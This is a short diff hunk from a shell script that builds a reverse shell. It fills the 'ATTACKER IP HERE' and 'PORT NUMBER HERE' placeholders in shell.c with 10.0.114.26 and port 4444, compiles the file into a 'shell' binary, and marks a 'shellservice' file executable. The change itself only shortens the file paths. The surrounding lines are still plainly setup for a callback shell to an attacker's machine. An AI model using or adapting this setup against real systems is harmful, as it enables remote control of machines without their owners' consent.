@@ -7,8 +7,8 @@ fi
 
 chmod +x shellservice
 
-sed -i -e 's/"ATTACKER IP HERE"/"10.0.114.26"/g' /home/reverse/reverse-shell/shell.c
-sed -i -e 's/PORT NUMBER HERE/4444/g' /home/reverse/reverse-shell/shell.c
+sed -i -e 's/"ATTACKER IP HERE"/"10.0.114.26"/g' shell.c
+sed -i -e 's/PORT NUMBER HERE/4444/g' shell.c
 
 gcc shell.c -o shell
 
